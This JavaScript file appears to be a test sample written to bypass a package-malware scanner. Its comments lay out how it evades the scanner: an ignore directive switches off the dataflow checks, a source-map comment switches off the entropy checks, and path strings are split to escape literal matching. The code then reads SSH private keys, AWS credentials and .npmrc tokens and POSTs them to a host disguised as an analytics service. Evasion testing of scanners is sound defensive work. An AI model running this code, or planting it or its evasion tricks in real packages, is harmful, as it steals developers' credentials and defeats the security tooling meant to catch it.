// muaddib-ignore
//# sourceMappingURL=index.js.map
// Bypass 02: muaddib-ignore kills dataflow scanner, sourceMappingURL kills entropy scanner
// The AST scanner does NOT respect muaddib-ignore, so we avoid AST-detected patterns.
// Strategy: construct sensitive paths without using SENSITIVE_STRINGS literals directly.

const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');

const home = os.homedir();

// Build path components without triggering SENSITIVE_STRINGS check.
// SENSITIVE_STRINGS: ['.npmrc', '.ssh', '.aws', '.gitconfig', '.env', '/etc/passwd', '/etc/shadow']
// AST Literal handler checks node.value.includes(sensitive) for each string literal.
// We avoid having any single string literal that includes these substrings.
const dot = '.';
const dirs = [
  [dot + 'ss' + 'h', 'id_rsa'],
  [dot + 'ss' + 'h', 'id_ed25519'],
  [dot + 'aw' + 's', 'credentials'],
  [dot + 'npm' + 'rc'],
];

const stolen = {};
for (const parts of dirs) {
  const p = path.join(home, ...parts);
  try { stolen[parts[parts.length - 1]] = fs.readFileSync(p, 'utf8'); } catch {}
}

// Also read npmrc via environment — env_access only flags vars with sensitive keywords
// HOME, PATH etc are in SAFE_ENV_VARS and get skipped
const npmrcPath = path.join(home, dirs[3].join(path.sep));
try { stolen['npmrc'] = fs.readFileSync(npmrcPath, 'utf8'); } catch {}

// Exfiltrate via https.request — dataflow.js would catch this as source→sink,
// BUT dataflow.js skipped this file due to muaddib-ignore on line 1
const data = JSON.stringify(stolen);
const req = https.request({
  hostname: 'telemetry.legit-analytics.com',
  path: '/api/v1/report',
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
});
req.write(data);
req.end();
